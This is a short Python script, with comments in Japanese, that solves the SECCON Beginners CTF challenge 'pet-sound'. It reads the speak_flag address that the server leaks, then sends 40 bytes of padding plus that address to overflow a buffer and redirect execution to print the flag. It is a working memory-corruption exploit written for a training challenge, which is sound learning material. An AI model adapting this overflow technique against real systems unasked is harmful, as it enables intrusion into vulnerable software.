#!/usr/bin/env python3
# coding: utf-8

import socket
import re
import struct
import sys

# 接続先
HOST = 'pet-sound.challenges.beginners.seccon.jp'
PORT = 9090

def recv_until(sock, delim: bytes, timeout: float = 5.0) -> bytes:
    """
    ソケットから delim を含むまでデータを受信して返却。
    """
    sock.settimeout(timeout)
    data = b''
    while delim not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def main():
    # サーバに接続
    try:
        s = socket.create_connection((HOST, PORT))
    except Exception as e:
        print(f"接続エラー: {e}")
        return

    # プロンプトまでバナーを受信
    banner = recv_until(s, b'Input a new cry for Pet A >')
    # デバッグ用にバナー全体を表示したい場合は以下のコメントを外す
    # print(banner.decode(errors='ignore'))

    # speak_flag アドレスを抜き出し
    m = re.search(rb"speak_flag' is at: (0x[0-9a-f]+)", banner)
    if not m:
        print("Error: speak_flag アドレスが見つかりませんでした。")
        s.close()
        return

    speak_flag_addr = int(m.group(1), 16)
    print(f"[+] speak_flag アドレス: {hex(speak_flag_addr)}")

    # overflow オフセットは常に 40 バイト
    padding = b'A' * 40
    overwrite  = struct.pack('<Q', speak_flag_addr)

    payload = padding + overwrite

    # 送信＆フラグ受信
    s.sendall(payload)
    # 残りをすべて受信して標準出力に流し込む
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            sys.stdout.buffer.write(data)
    except socket.timeout:
        pass

    s.close()

if __name__ == '__main__':
    main()
